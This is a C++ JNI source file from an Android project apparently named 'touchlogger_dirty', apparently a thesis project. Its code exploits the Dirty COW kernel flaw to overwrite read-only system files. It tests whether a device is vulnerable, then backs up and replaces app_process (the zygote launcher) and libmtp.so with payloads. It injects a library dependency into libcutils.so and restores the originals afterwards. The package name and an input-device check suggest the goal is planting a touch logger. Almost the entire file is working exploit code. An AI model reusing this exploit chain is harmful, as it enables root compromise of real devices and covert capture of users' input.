#include <jni.h>
#include <string>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "dirty/file_utils/file_utils.h"
#include "dirty/file_utils/dirty_copy.h"
#include "dirty/lib_utils/inject.h"

#ifdef __aarch64__
#define APP_PROCESS_PATH "/system/bin/app_process64"
#define LIBCUTILS_PATH "/system/lib64/libcutils.so"
#define LIBMTP_PATH "/system/lib64/libmtp.so"
#else
#define APP_PROCESS_PATH "/system/bin/app_process32"
#define LIBCUTILS_PATH "/system/lib/libcutils.so"
#define LIBMTP_PATH "/system/lib/libmtp.so"
#endif

#define APP_PROCESS_FALLBACK_PATH "/system/bin/app_process"
#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"

// TODO: make this depend on build type
#define DEBUG 1

char app_process_backup_path[PATH_MAX];
char exec_payload_path[PATH_MAX];
char payload_path[PATH_MAX];
char app_process_remote_path[PATH_MAX];
char libcutils_backup_path[PATH_MAX];
char libmtp_backup_path[PATH_MAX];
char shared_payload_path[PATH_MAX];

static bool prepareCommon(const char* localPath)
{
  snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");
  snprintf(payload_path, PATH_MAX, "%s/%s", localPath, "payload");
  snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
  snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
  snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");

  struct stat st;
  if (stat(APP_PROCESS_PATH, &st) == 0)
  {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_PATH);
  }
  else
  {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_FALLBACK_PATH);
  }

  LOGV("Backup app_process...");

  if (copy_file_with_mode(app_process_remote_path, app_process_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return false;
  }

  LOGV("Done!");
  LOGV("Move exec_payload to external memory...");

  if (copy_file(exec_payload_path, EXEC_PAYLOAD_SDCARD_PATH) == -1)
  {
    LOGV("Failed!");
    return false;
  }

  LOGV("Done!");

  return true;
}

static int createTestFile(const char* filename, const char* fileContents)
{
  FILE* file = fopen(filename, "w+");
  if (file == NULL)
  {
    LOGV("Unable to open file \"%s\": %s!", filename, strerror(errno));
    return -1;
  }

  size_t written = fwrite(fileContents, strlen(fileContents), sizeof(char), file);
  if (written != strlen(fileContents))
  {
    LOGV("Unable to write to \"%s\": written %d instead of %d bytes: %s!",
         filename, written, strlen(fileContents), strerror(errno));
    fclose(file);
    return -1;
  }

  fclose(file);
  return 0;
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_isVulnerable(JNIEnv* env, jclass type,
                                                                    jstring baseDir_)
{
  const char* baseDir = env->GetStringUTFChars(baseDir_, 0);

  struct stat st;
  if (stat(baseDir, &st) == -1)
  {
    LOGV("Unable to access base dir \"%s\": %s!", baseDir, strerror(errno));
    env->ReleaseStringUTFChars(baseDir_, baseDir);
    return (jboolean) false;
  }

  char testFile1[BUFSIZ];
  char testFile2[BUFSIZ];

  const char* fileName1 = "test1";
  const char* fileName2 = "test2";

  memset(testFile1, 0, BUFSIZ);
  memset(testFile2, 0, BUFSIZ);

  snprintf(testFile1, BUFSIZ, "%s/%s", baseDir, fileName1);
  snprintf(testFile2, BUFSIZ, "%s/%s", baseDir, fileName2);

  env->ReleaseStringUTFChars(baseDir_, baseDir);

  const char* contents1 = "File content. Important AF";
  const char* contents2 = "Wow, such dirty, much cow!";

  if (createTestFile(fileName1, contents1) == -1 ||
      createTestFile(fileName2, contents2) == -1)
  {
    LOGV("Unable to create one of test files");
    return jboolean(false);
  }

  if (chmod(fileName1, 0444) == -1)
  {
    LOGV("Unable to make \"%s\" read-only: %s!", fileName1, strerror(errno));
    return (jboolean) false;
  }

  if (dirty_copy(fileName2, fileName1) == -1)
  {
    LOGV("Device is not vulnerable!");
    unlink(fileName1);
    unlink(fileName2);
    return (jboolean) false;
  }

  int fd;
  if ((fd = open(fileName1, O_RDONLY)) == -1)
  {
    LOGV("Unable to open \"%s\" for reading: %s!", fileName1, strerror(errno));
    unlink(fileName1);
    unlink(fileName2);
    return (jboolean) false;
  }

  size_t len = strlen(contents2);
  char buf[len + 1];
  memset(buf, 0, len + 1);
  int readed = read(fd, buf, len);

  close(fd);
  unlink(fileName1);
  unlink(fileName2);

  if (readed != len)
  {
    LOGV("Unable to read from \"%s\": read %d instead of %d: %s!",
         fileName1, readed, len, strerror(errno));
    return (jboolean) false;
  }

  if (strcmp(contents2, buf) != 0)
  {
    LOGV("Vulnerability exploitation had no effect!");
    return (jboolean) false;
  }

  return (jboolean) true;
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_normalInstallationIsPossible(JNIEnv* env,
                                                                                   jclass type)
{
  // check we have access to input devices
  const char* inputDevicePath = "/dev/input/event0";
  int inputDeviceFd = open(inputDevicePath, O_RDONLY);
  if (inputDeviceFd == -1)
  {
    LOGV("Unable to open input device \"%s\": %s!", inputDevicePath, strerror(errno));
    return (jboolean) false;
  }

  close(inputDeviceFd);
  return (jboolean) true;
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepareA(JNIEnv* env, jclass type,
                                                                jstring localPath_)
{
  const char* localPath = env->GetStringUTFChars(localPath_, 0);

  bool res = prepareCommon(localPath);

  env->ReleaseStringUTFChars(localPath_, localPath);

  return (jboolean) res;
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepareB(JNIEnv* env, jclass type,
                                                                jstring localPath_)
{
  const char* localPath = env->GetStringUTFChars(localPath_, 0);

  bool res = prepareCommon(localPath);
  if (!res)
  {
    return (jboolean) false;
  }

  LOGV("Backup libmtp...");

  if (copy_file_with_mode(LIBMTP_PATH, libmtp_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }

  LOGV("Done!");
  LOGV("Backup libcutils...");

  if (copy_file_with_mode(LIBCUTILS_PATH, libcutils_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }

  LOGV("Replace libmtp...");
  if (dirty_copy(shared_payload_path, LIBMTP_PATH) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }

  LOGV("Done!")
  LOGV("Inject dependency into libcutils...")

  if (inject_dependency_into_library(LIBCUTILS_PATH, "libmtp.so") == -1)
  {
    LOGV("Failed!");
    LOGV("Temporary fix for test device...");
    LOGV("Please report if you see this in production version!");
    // FIXME: Temp fix for my Nexus 5, remove before production code!
    if (replace_dependency_in_binary(LIBCUTILS_PATH, "libcutils.so", "libmtp.so") == -1)
    {
      LOGV("Failed!");
      return (jboolean) false;
    }
  }
  LOGV("Done!");

  env->ReleaseStringUTFChars(localPath_, localPath);

  return (jboolean) true;
}

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerA(JNIEnv* env, jclass type)
{
  if (fork() == 0)
  {
    if (daemon(0, 0) == -1)
    {
      LOGV("Unable to daemonize process: %s!", strerror(errno));
    }
    else
    {
      LOGV("Start as daemon!");
    }

    int killer_pid;
    if ((killer_pid = fork()) == 0)
    {
      if (dirty_copy(payload_path, app_process_remote_path) == -1)
      {
        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_remote_path, payload_path);
        exit(-1);
      }
      else
      {
        LOGV("App_process successfully overwritten!");
      }

      exit(0);
    }

    //FIXME: come up with something less dumb than that
    sleep(10);

    LOGV("Zygote is probably overwritten now");

    if (kill(killer_pid, SIGKILL) == -1)
    {
      LOGV("Unable to kill killer thread: %s", strerror(errno));
    }
    else
    {
      LOGV("Killer process killed successfully!");
    }

    if (dirty_copy(app_process_backup_path, app_process_remote_path) == -1)
    {
      LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
      exit(-1);
    }
    else
    {
      LOGV("Zygote successfully restarted!");
    }

    LOGV("Done!");
    exit(0);
  }
}

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerB(JNIEnv* env, jclass type)
{
  if (fork() == 0)
  {
    if (daemon(0, 0) == -1)
    {
      LOGV("Unable to daemonize process: %s!", strerror(errno));
    }
    else
    {
      LOGV("Start as daemon!");
    }

    int killer_pid;
    if ((killer_pid = fork()) == 0)
    {
      if (dirty_copy(shared_payload_path, APP_PROCESS_PATH) == -1)
      {
        LOGV("Unable to overwrite app_process (%s) with %s!", APP_PROCESS_PATH,
             shared_payload_path);
        exit(-1);
      }
      else
      {
        LOGV("App_process successfully overwritten!");
      }

      exit(0);
    }

    //FIXME: come up with something less dumb than that
    sleep(10);

    LOGV("Zygote is probably dead now");

    if (kill(killer_pid, SIGKILL) == -1)
    {
      LOGV("Unable to kill killer thread: %s", strerror(errno));
    }
    else
    {
      LOGV("Killer process killed successfully!");
    }

    if (dirty_copy(app_process_backup_path, APP_PROCESS_PATH) == -1)
    {
      LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
      exit(-1);
    }
    else
    {
      LOGV("Zygote successfully restarted!");
    }

    sleep(10);

    LOGV("Return everything to initial state");

    if (!(killer_pid = fork()))
    {
      dirty_copy(shared_payload_path, APP_PROCESS_PATH);
      exit(0);
    }
    else
    {
      sleep(5);
    }

    LOGV("Wait for it...");
    sleep(5);

    kill(killer_pid, SIGKILL);
    LOGV("Done! About to resurrect it");

    dirty_copy(libmtp_backup_path, LIBMTP_PATH);
    dirty_copy(libcutils_backup_path, LIBCUTILS_PATH);
    dirty_copy(app_process_backup_path, APP_PROCESS_PATH);
    LOGV("Done!");

    exit(0);
  }
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_stringFromJNI(JNIEnv* env,
                                                                     jobject instance)
{
  std::string hello = "Hello from C++";
  return env->NewStringUTF(hello.c_str());
}
